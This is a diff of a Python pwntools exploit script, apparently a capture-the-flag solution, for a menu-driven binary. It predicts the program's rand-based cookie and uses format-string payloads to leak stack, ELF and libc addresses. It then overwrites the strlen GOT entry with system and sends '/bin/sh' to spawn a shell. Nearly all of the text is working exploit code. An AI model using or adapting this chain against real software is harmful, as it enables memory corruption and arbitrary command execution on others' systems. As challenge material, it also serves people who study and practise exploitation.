@@ -28,15 +28,21 @@ def DEBUG(cmd = ""):
 
 def Play(length, name):
     io.sendlineafter("xit\n", "P")
-    s = []
+    cookie = []
     for i in xrange(24):
-        s.append(chr(dll.rand() % 26 + ord('A')))
+        cookie.append(chr(dll.rand() % 26 + ord('A')))
 
-    s = "".join(s)
-    #  print s
-    io.sendlineafter(":\n", s)
+    cookie = "".join(cookie)
+    #  print cookie
+    io.sendlineafter(":\n", cookie)
     io.sendlineafter(":\n", str(length))
     io.sendafter(":\n", name)
+    return cookie
+
+def Delete(idx, cookie):
+    io.sendlineafter("xit\n", "D")
+    io.sendlineafter(":\n", str(idx))
+    io.sendlineafter(":\n", cookie)
 
 def Show():
     io.sendlineafter("xit\n", "S")
@@ -45,23 +51,49 @@ if __name__ == "__main__":
     dll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
     dll.srand(1)
 
-    Play(20, "%8$p..%9$p..%13$p..")
-    DEBUG()
+    cookie = Play(120, "%8$p..%9$p..%13$p..\0")
     Show()
     io.recvuntil("0x")
-    showRbp = int(io.recvuntil("..", drop = True), 16)
-    success("showRbp -> {:#x}".format(showRbp))
-    elfBase = int(io.recvuntil("..", drop = True), 16) - 0x18d5
-    success("elfBase -> {:#x}".format(elfBase))
-    libcBase = int(io.recvuntil("..", drop = True), 16) - libc.sym['__libc_start_main'] - 241
-    success("libcBase -> {:#x}".format(libcBase))
+    stack = int(io.recvuntil("..", drop = True), 16) - 0x20
+    success("stack -> {:#x}".format(stack))
+    elf.address = int(io.recvuntil("..", drop = True), 16) - 0x18d5
+    success("elf.address -> {:#x}".format(elf.address))
+    libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['__libc_start_main'] - 241
+    success("libc.address -> {:#x}".format(libc.address))
     pause()
-    freeHook = libcBase + libc.sym[u'__free_hook']
+    Delete(0, cookie)
 
+    payload = "%{}c%{}$hn".format((stack + 0x20) & 0xffff, 0x9 + 6)
+    payload += "%{}c%{}$hn".format(2, 0x17 + 6)
+    cookie = Play(120, payload + '\0')
+    Show()
+    Delete(0, cookie)
 
-    
+    payload = "%{}c%{}$hhn".format((elf.got['strlen'] >> 16 & 0xff), 0x25 + 6)
+    payload += "%{}c%{}$hn".format((elf.got['strlen'] & 0xffff) - (elf.got['printf'] >> 16 & 0xff), 0x23 + 6)
+    cookie = Play(120, payload + '\0')
+    Show()
+    Delete(0, cookie)
+
+    payload = "%{}c%{}$hn".format((stack + 0x48) & 0xffff, 0x9 + 6)
+    payload += "%{}c%{}$hn".format(2, 0x17 + 6)
+    cookie = Play(120, payload + '\0')
+    Show()
+    Delete(0, cookie)
+
+    payload = "%{}c%{}$hhn".format(((elf.got['strlen'] + 2) >> 16 & 0xff), 0x25 + 6)
+    payload += "%{}c%{}$hn".format(((elf.got['strlen'] + 2) & 0xffff) - (elf.got['printf'] >> 16 & 0xff), 0x23 + 6)
+    cookie = Play(120, payload + '\0')
+    Show()
+    Delete(0, cookie)
+
+    #  DEBUG()
+    payload = "%{}c%{}$hhn".format((libc.sym['system'] >> 16 & 0xff), 0xb + 6)
+    payload += "%{}c%{}$hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] >> 16 & 0xff), 0x6 + 6)
+    cookie = Play(120, payload + '\0')
+    Show()
+
+    Play(120, "/bin/sh\0")
+
     io.interactive()
     io.close()
-
-
-
